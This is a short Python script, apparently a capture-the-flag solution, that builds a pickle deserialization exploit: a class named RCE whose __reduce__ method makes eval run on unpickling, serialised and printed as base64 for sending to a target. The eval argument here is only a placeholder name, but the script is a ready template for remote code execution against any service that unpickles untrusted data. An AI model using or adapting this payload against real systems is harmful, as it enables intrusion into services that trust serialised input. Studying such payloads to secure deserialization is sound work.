import pickle
import base64

class RCE:
	def __reduce__(self):
		return eval, ('[flag]',)

pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled))
